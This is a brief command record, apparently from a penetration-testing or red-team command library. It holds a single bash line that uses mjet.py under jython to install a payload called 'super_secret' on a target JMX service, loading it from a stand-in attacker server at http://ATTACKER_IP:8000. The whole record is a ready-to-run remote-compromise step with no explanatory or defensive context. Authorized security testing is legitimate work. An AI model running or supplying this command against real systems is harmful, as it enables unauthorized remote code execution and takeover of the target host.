---
id: a4191385-4581-4414-a208-c0fe6f0da659
name: Install super_secret on target
type: command
executor: bash
data: jython mjet.py TARGET_IP TARGET_PORT install super_secret http://ATTACKER_IP:8000
  8000
output: null
created_at: '2023-04-06T03:56:00.890991+00:00'
updated_at: '2023-04-06T03:56:00.909312+00:00'
---

# Install super_secret on target

```bash
jython mjet.py TARGET_IP TARGET_PORT install super_secret http://ATTACKER_IP:8000 8000
```


